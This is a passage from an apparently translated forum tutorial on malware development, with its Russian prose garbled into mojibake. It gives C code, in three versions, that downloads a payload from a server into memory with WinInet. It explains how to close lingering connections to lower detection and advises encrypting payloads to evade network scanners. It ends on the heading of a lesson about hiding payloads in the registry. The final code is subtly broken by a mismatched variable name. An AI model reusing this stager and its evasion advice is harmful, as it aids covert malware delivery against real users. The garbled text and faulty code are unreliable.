–í–∞–∂–Ω–æ –∑–Ω–∞—Ç—å, —á—Ç–æ WinAPI InternetCloseHandle –Ω–µ –∑–∞–∫—Ä—ã–≤–∞–µ—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ HTTP/S. WinInet –ø—ã—Ç–∞–µ—Ç—Å—è –ø–æ–≤—Ç–æ—Ä–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è, –∏, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –Ω–µ—Å–º–æ—Ç—Ä—è –Ω–∞ –∑–∞–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞, —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –æ—Å—Ç–∞–µ—Ç—Å—è –∞–∫—Ç–∏–≤–Ω—ã–º. –ó–∞–∫—Ä—ã—Ç–∏–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è –≤–∞–∂–Ω–æ –¥–ª—è —Å–Ω–∏–∂–µ–Ω–∏—è –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è. –ù–∞–ø—Ä–∏–º–µ—Ä, —Å–æ–∑–¥–∞–Ω –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª, –∫–æ—Ç–æ—Ä—ã–π –∏–∑–≤–ª–µ–∫–∞–µ—Ç payload —Å GitHub.<br />
<br />
–ù–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –Ω–∏–∂–µ –ø–æ–∫–∞–∑–∞–Ω–æ, —á—Ç–æ –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª –≤—Å–µ –µ—â–µ –ø–æ–¥–∫–ª—é—á–µ–Ω –∫ GitHub, –Ω–µ—Å–º–æ—Ç—Ä—è –Ω–∞ —Ç–æ, —á—Ç–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–æ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780549768.png"
		data-src="https://osint42.org/attachments/1746780549768-png.104/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780549768-png.104/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780549768.png"
			title="1746780549768.png"
			width="1156" height="228" loading="lazy" />
	</div><br />
<br />
–ö —Å—á–∞—Å—Ç—å—é, —Ä–µ—à–µ–Ω–∏–µ –ø—Ä–æ—Å—Ç–æ–µ. –í—Å—ë, —á—Ç–æ —Ç—Ä–µ–±—É–µ—Ç—Å—è ‚Äî —ç—Ç–æ —É–∫–∞–∑–∞—Ç—å WinInet –∑–∞–∫—Ä—ã—Ç—å –≤—Å–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º API InternetSetOptionW.<br />
<br />
–í—ã–∑–æ–≤ InternetSetOptionW —Å —Ñ–ª–∞–≥–æ–º INTERNET_OPTION_SETTINGS_CHANGED –∑–∞—Å—Ç–∞–≤–∏—Ç —Å–∏—Å—Ç–µ–º—É –æ–±–Ω–æ–≤–∏—Ç—å –∫—ç—à–∏—Ä–æ–≤–∞–Ω–Ω—É—é –≤–µ—Ä—Å–∏—é –µ—ë –∏–Ω—Ç–µ—Ä–Ω–µ—Ç-–Ω–∞—Å—Ç—Ä–æ–µ–∫, —á—Ç–æ –≤ –∫–æ–Ω–µ—á–Ω–æ–º –∏—Ç–æ–≥–µ –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ –∑–∞–∫—Ä—ã—Ç–∏—é —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã—Ö WinInet —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);</code></pre>
	</div>
</div><br />
<b>–ò–∑–≤–ª–µ—á–µ–Ω–∏–µ Payload - –§—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è GetPayloadFromUrl –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –≤—ã—à–µ—É–ø–æ–º—è–Ω—É—Ç—ã–µ —à–∞–≥–∏ –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è payload —Å —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞ –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –µ–≥–æ –≤ –±—É—Ñ–µ—Ä–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetPayloadFromUrl() {

    HINTERNET    hInternet              = NULL,
                hInternetFile          = NULL;

    PBYTE        pBytes                 = NULL;

    DWORD        dwBytesRead            = NULL;

    // –û—Ç–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Å–µ–∞–Ω—Å–∞ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞
    hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        printf(&quot;[!] InternetOpenW Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –û—Ç–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –¥–ª—è URL payload
    hInternetFile = InternetOpenUrlW(hInternet, L&quot;http://127.0.0.1:8000/calc.bin&quot;, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetFile == NULL) {
        printf(&quot;[!] InternetOpenUrlW Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –í—ã–¥–µ–ª–µ–Ω–∏–µ –±—É—Ñ–µ—Ä–∞ –¥–ª—è payload
    pBytes = (PBYTE)LocalAlloc(LPTR, 272);

    // –ß—Ç–µ–Ω–∏–µ payload
    if (!InternetReadFile(hInternetFile, pBytes, 272, &amp;dwBytesRead)) {
        printf(&quot;[!] InternetReadFile Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    InternetCloseHandle(hInternet);
    InternetCloseHandle(hInternetFile);
    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    LocalFree(pBytes);

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–î–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–µ –≤—ã–¥–µ–ª–µ–Ω–∏–µ —Ä–∞–∑–º–µ—Ä–∞ Payload </b><br />
<br />
–í—ã—à–µ—É–∫–∞–∑–∞–Ω–Ω–∞—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è —Ä–∞–±–æ—Ç–∞–µ—Ç, –∫–æ–≥–¥–∞ —Ä–∞–∑–º–µ—Ä payload –∏–∑–≤–µ—Å—Ç–µ–Ω. –ï—Å–ª–∏ —Ä–∞–∑–º–µ—Ä –Ω–µ–∏–∑–≤–µ—Å—Ç–µ–Ω –∏–ª–∏ –±–æ–ª—å—à–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –±–∞–π—Ç, —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –≤ InternetReadFile, –º–æ–∂–µ—Ç –≤–æ–∑–Ω–∏–∫–Ω—É—Ç—å –ø–µ—Ä–µ–ø–æ–ª–Ω–µ–Ω–∏–µ –∫—É—á–∏, —á—Ç–æ –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ –∞–≤–∞—Ä–∏–π–Ω–æ–º—É –∑–∞–≤–µ—Ä—à–µ–Ω–∏—é —Ä–∞–±–æ—Ç—ã –ø—Ä–æ–≥—Ä–∞–º–º—ã.<br />
<br />
–û–¥–∏–Ω –∏–∑ —Å–ø–æ—Å–æ–±–æ–≤ —Ä–µ—à–µ–Ω–∏—è —ç—Ç–æ–π –ø—Ä–æ–±–ª–µ–º—ã –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º, —á—Ç–æ–±—ã –ø–æ–º–µ—Å—Ç–∏—Ç—å InternetReadFile –≤ —Ü–∏–∫–ª while –∏ –ø—Ä–æ–¥–æ–ª–∂–∞—Ç—å —á–∏—Ç–∞—Ç—å –ø–æ—Å—Ç–æ—è–Ω–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –±–∞–π—Ç, –∫–æ—Ç–æ—Ä–æ–µ, –≤ –¥–∞–Ω–Ω–æ–º –ø—Ä–∏–º–µ—Ä–µ, —Ä–∞–≤–Ω–æ 1024 –±–∞–π—Ç–∞.<br />
<br />
–ë–∞–π—Ç—ã —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è –Ω–µ–ø–æ—Å—Ä–µ–¥—Å—Ç–≤–µ–Ω–Ω–æ –≤–æ –≤—Ä–µ–º–µ–Ω–Ω–æ–º –±—É—Ñ–µ—Ä–µ, –∫–æ—Ç–æ—Ä—ã–π –∏–º–µ–µ—Ç —Ç–æ—Ç –∂–µ —Ä–∞–∑–º–µ—Ä, 1024 –±–∞–π—Ç–∞. –í—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Ñ–µ—Ä –¥–æ–±–∞–≤–ª—è–µ—Ç—Å—è –∫ –æ–±—â–µ–º—É –±—É—Ñ–µ—Ä—É, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –Ω–µ–ø—Ä–µ—Ä—ã–≤–Ω–æ –ø–µ—Ä–µ—Ä–∞—Å–ø—Ä–µ–¥–µ–ª—è—Ç—å—Å—è, —á—Ç–æ–±—ã –≤–º–µ—â–∞—Ç—å –∫–∞–∂–¥—ã–π –Ω–æ–≤—ã–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç —Ä–∞–∑–º–µ—Ä–æ–º 1024 –±–∞–π—Ç–∞, —Å—á–∏—Ç–∞–Ω–Ω—ã–π —Å —Å–µ—Ä–≤–µ—Ä–∞.<br />
–ö–∞–∫ —Ç–æ–ª—å–∫–æ InternetReadFile –ø—Ä–æ—á–∏—Ç–∞–µ—Ç –∑–Ω–∞—á–µ–Ω–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ –º–µ–Ω—å—à–µ 1024, —ç—Ç–æ –±—É–¥–µ—Ç –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä–æ–º –¥–æ—Å—Ç–∏–∂–µ–Ω–∏—è –∫–æ–Ω—Ü–∞ —Ñ–∞–π–ª–∞, –∏ —Ü–∏–∫–ª –∑–∞–≤–µ—Ä—à–∏—Ç—Å—è.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetPayloadFromUrl() {

    HINTERNET    hInternet              = NULL,
                hInternetFile          = NULL;

    DWORD        dwBytesRead            = NULL;

    SIZE_T        sSize                   = NULL; // –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ –∫–∞—á–µ—Å—Ç–≤–µ –æ–±—â–µ–≥–æ —Ä–∞–∑–º–µ—Ä–∞ payload

    PBYTE        pBytes                  = NULL; // –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ –∫–∞—á–µ—Å—Ç–≤–µ –æ–±—â–µ–≥–æ –±—É—Ñ–µ—Ä–∞ payload
    PBYTE        pTmpBytes               = NULL; // –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∫–∞–∫ –≤—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Ñ–µ—Ä —Ä–∞–∑–º–µ—Ä–æ–º 1024 –±–∞–π—Ç–∞

    // –û—Ç–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Å–µ–∞–Ω—Å–∞ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞
    hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        printf(&quot;[!] InternetOpenW Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –û—Ç–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –¥–ª—è URL payload
    hInternetFile = InternetOpenUrlW(hInternet, L&quot;http://127.0.0.1:8000/calc.bin&quot;, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetFile == NULL) {
        printf(&quot;[!] InternetOpenUrlW Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –í—ã–¥–µ–ª–µ–Ω–∏–µ 1024 –±–∞–π—Ç–æ–≤ –¥–ª—è –≤—Ä–µ–º–µ–Ω–Ω–æ–≥–æ –±—É—Ñ–µ—Ä–∞
    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        return FALSE;
    }

    while (TRUE) {

        // –ß—Ç–µ–Ω–∏–µ 1024 –±–∞–π—Ç–æ–≤ –≤–æ –≤—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Ñ–µ—Ä
        // InternetReadFile –±—É–¥–µ—Ç —á–∏—Ç–∞—Ç—å –º–µ–Ω—å—à–µ –±–∞–π—Ç –≤ —Å–ª—É—á–∞–µ, –µ—Å–ª–∏ –ø–æ—Å–ª–µ–¥–Ω–∏–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç –º–µ–Ω—å—à–µ 1024 –±–∞–π—Ç–æ–≤
        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &amp;dwBytesRead)) {
            printf(&quot;[!] InternetReadFile Failed With Error : %d \n&quot;, GetLastError());
            return FALSE;
        }

        // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Ä–∞–∑–º–µ—Ä–∞ –æ–±—â–µ–≥–æ –±—É—Ñ–µ—Ä–∞
        sSize += dwBytesRead;

        // –í —Å–ª—É—á–∞–µ, –µ—Å–ª–∏ –æ–±—â–∏–π –±—É—Ñ–µ—Ä –µ—â–µ –Ω–µ –≤—ã–¥–µ–ª–µ–Ω
        // –∑–∞—Ç–µ–º –≤—ã–¥–µ–ª–∏—Ç–µ –µ–≥–æ –≤ —Ä–∞–∑–º–µ—Ä–µ —Å—á–∏—Ç–∞–Ω–Ω—ã—Ö –±–∞–π—Ç–æ–≤, —Ç–∞–∫ –∫–∞–∫ –æ–Ω–∏ –º–æ–≥—É—Ç –±—ã—Ç—å –º–µ–Ω—å—à–µ 1024 –±–∞–π—Ç–æ–≤
        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
            // –í –ø—Ä–æ—Ç–∏–≤–Ω–æ–º —Å–ª—É—á–∞–µ, –ø–µ—Ä–µ—Ä–∞—Å–ø—Ä–µ–¥–µ–ª–∏—Ç–µ pBytes —Ä–∞–≤–Ω—ã–º –æ–±—â–µ–º—É —Ä–∞–∑–º–µ—Ä—É, sSize.
            // –≠—Ç–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –¥–ª—è —Ä–∞–∑–º–µ—â–µ–Ω–∏—è –≤—Å–µ–≥–æ payload
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

        if (pBytes == NULL) {
            return FALSE;
        }

        // –î–æ–±–∞–≤–∏—Ç—å –≤—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Ñ–µ—Ä –≤ –∫–æ–Ω–µ—Ü –æ–±—â–µ–≥–æ –±—É—Ñ–µ—Ä–∞
        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

        // –û—á–∏—Å—Ç–∏—Ç–µ –≤—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Ñ–µ—Ä
        memset(pTmpBytes, &#039;\0&#039;, dwBytesRead);

        // –ï—Å–ª–∏ –±—ã–ª–æ –ø—Ä–æ—á–∏—Ç–∞–Ω–æ –º–µ–Ω—å—à–µ 1024 –±–∞–π—Ç–æ–≤, —ç—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –¥–æ—Å—Ç–∏–≥–Ω—É—Ç –∫–æ–Ω–µ—Ü —Ñ–∞–π–ª–∞
        // –°–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –≤—ã–π—Ç–∏ –∏–∑ —Ü–∏–∫–ª–∞
        if (dwBytesRead &lt; 1024) {
            break;
        }

        // –í –ø—Ä–æ—Ç–∏–≤–Ω–æ–º —Å–ª—É—á–∞–µ, —á–∏—Ç–∞–π—Ç–µ —Å–ª–µ–¥—É—é—â–∏–µ 1024 –±–∞–π—Ç–∞
    }

    // –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã
    InternetCloseHandle(hInternet);
    InternetCloseHandle(hInternetFile);
    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    LocalFree(pTmpBytes);
    LocalFree(pBytes);

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–§–∏–Ω–∞–ª—å–Ω—ã–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –¥–ª—è —Ä–∞–∑–º–µ—â–µ–Ω–∏—è Payload</b><br />
<br />
–¢–µ–ø–µ—Ä—å —Ñ—É–Ω–∫—Ü–∏—è GetPayloadFromUrl –ø—Ä–∏–Ω–∏–º–∞–µ—Ç 3 –ø–∞—Ä–∞–º–µ—Ç—Ä–∞:<br />
<ul>
<li data-xf-list-type="ul">szUrl - URL-–∞–¥—Ä–µ—Å payload.</li>
<li data-xf-list-type="ul">pPayloadBytes - –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –±—É—Ñ–µ—Ä–∞, —Å–æ–¥–µ—Ä–∂–∞—â–µ–≥–æ payload.</li>
<li data-xf-list-type="ul">sPayloadSize - –æ–±—â–∏–π —Ä–∞–∑–º–µ—Ä –ø—Ä–æ—á–∏—Ç–∞–Ω–Ω–æ–≥–æ payload.</li>
</ul>–§—É–Ω–∫—Ü–∏—è —Ç–∞–∫–∂–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ –∑–∞–∫—Ä—ã–≤–∞–µ—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è HTTP/S –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è payload.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
 
    BOOL        bSTATE            = TRUE;

    HINTERNET    hInternet         = NULL,
                hInternetFile     = NULL;

    DWORD        dwBytesRead       = NULL;

    SIZE_T        sSize             = NULL;
    PBYTE        pBytes            = NULL,
                pTmpByte          = NULL;

    hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
    if (hInternet == NULL){
        printf(&quot;[!] InternetOpenW Failed With Error : %d \n&quot;, GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetFile == NULL){
        printf(&quot;[!] InternetOpenUrlW Failed With Error : %d \n&quot;, GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL){
        bSTATE = FALSE; goto _EndOfFunction;
    }

    while (TRUE){
        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &amp;dwBytesRead)) {
            printf(&quot;[!] InternetReadFile Failed With Error : %d \n&quot;, GetLastError());
            bSTATE = FALSE; goto _EndOfFunction;
        }

        sSize += dwBytesRead;

        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

        if (pBytes == NULL) {
            bSTATE = FALSE; goto _EndOfFunction;
        }

        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
        memset(pTmpBytes, &#039;\0&#039;, dwBytesRead);

        if (dwBytesRead &lt; 1024){
            break;
        }
    }

    *pPayloadBytes = pBytes;
    *sPayloadSize  = sSize;

_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    if (pTmpBytes)
        LocalFree(pTmpBytes);
    return bSTATE;
}</code></pre>
	</div>
</div><br />
<b>–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ –∫ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏</b><br />
<br />
–í —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ  payload –∏–∑–≤–ª–µ–∫–∞–µ—Ç—Å—è –∏–∑ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞ –≤ –≤–∏–¥–µ —Å—ã—Ä—ã—Ö –¥–≤–æ–∏—á–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö, –±–µ–∑ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –∏–ª–∏ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏.<br />
<br />
–•–æ—Ç—è —Ç–∞–∫–æ–π –ø–æ–¥—Ö–æ–¥ –º–æ–∂–µ—Ç –æ–±–æ–π—Ç–∏ –±–∞–∑–æ–≤—ã–µ –º–µ—Ä—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –∫–æ—Ç–æ—Ä—ã–µ –∞–Ω–∞–ª–∏–∑–∏—Ä—É—é—Ç –¥–≤–æ–∏—á–Ω—ã–π –∫–æ–¥ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –ø—Ä–∏–∑–Ω–∞–∫–æ–≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–π –¥–µ—è—Ç–µ–ª—å–Ω–æ—Å—Ç–∏, <b><u>–Ω–æ –µ–≥–æ –º–æ–≥—É—Ç –ø–æ–º–µ—Ç–∏—Ç—å —Å–µ—Ç–µ–≤—ã–µ —Å–∫–∞–Ω–∏—Ä—É—é—â–∏–µ —É—Ç–∏–ª–∏—Ç—ã. </u></b><br />
<br />
–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –µ—Å–ª–∏ payload –Ω–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω, –∑–∞—Ö–≤–∞—á–µ–Ω–Ω—ã–µ –ø–∞–∫–µ—Ç—ã –≤–æ –≤—Ä–µ–º—è –ø–µ—Ä–µ–¥–∞—á–∏ –º–æ–≥—É—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å —É–∑–Ω–∞–≤–∞–µ–º—ã–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç—ã payload.<br />
–≠—Ç–æ –º–æ–∂–µ—Ç —Ä–∞—Å–∫—Ä—ã—Ç—å —Å–∏–≥–Ω–∞—Ç—É—Ä—É payload, —á—Ç–æ –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ —Ç–æ–º—É, —á—Ç–æ –ø—Ä–æ—Ü–µ—Å—Å –≤–Ω–µ–¥—Ä–µ–Ω–∏—è –±—É–¥–µ—Ç –ø–æ–º–µ—á–µ–Ω.<br />
<br />
–í —Ä–µ–∞–ª—å–Ω—ã—Ö —É—Å–ª–æ–≤–∏—è—Ö –≤—Å–µ–≥–¥–∞ —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è —à–∏—Ñ—Ä–æ–≤–∞—Ç—å –∏–ª–∏ –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞—Ç—å payload, –¥–∞–∂–µ –µ—Å–ª–∏ –æ–Ω –∏–∑–≤–ª–µ–∫–∞–µ—Ç—Å—è –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è.<br />
<br />
<b>–ó–∞–ø—É—Å–∫ —Ñ–∏–Ω–∞–ª—å–Ω–æ–≥–æ –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞</b><br />
<br />
–ë–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª —É—Å–ø–µ—à–Ω–æ –∏–∑–≤–ª–µ–∫–∞–µ—Ç payload.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780566527.png"
		data-src="https://osint42.org/attachments/1746780566527-png.105/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780566527-png.105/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780566527.png"
			title="1746780566527.png"
			width="1085" height="537" loading="lazy" />
	</div><br />
<br />
–°–æ–µ–¥–∏–Ω–µ–Ω–∏—è –∑–∞–∫—Ä—ã–≤–∞—é—Ç—Å—è –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780572635.png"
		data-src="https://osint42.org/attachments/1746780572635-png.106/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780572635-png.106/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780572635.png"
			title="1746780572635.png"
			width="1188" height="339" loading="lazy" />
	</div></div>
						

							<h2>–ü—Ä—è—á–µ–º Payload –≤ —Ä–µ–µ—Å—Ç—Ä–µ</h2>

							

							

							<div class="bbWrapper">–í –æ–±—â–µ–º –∏–∑ –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö —É—Ä–æ–∫–æ–≤ –º—ã —Å –≤–∞–º–∏ –∑–Ω–∞–µ–º, —á—Ç–æ payload –Ω–µ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –¥–æ–ª–∂–µ–Ω —Ö—Ä–∞–Ω–∏—Ç—å—Å—è –≤–Ω—É—Ç—Ä–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã.<br />
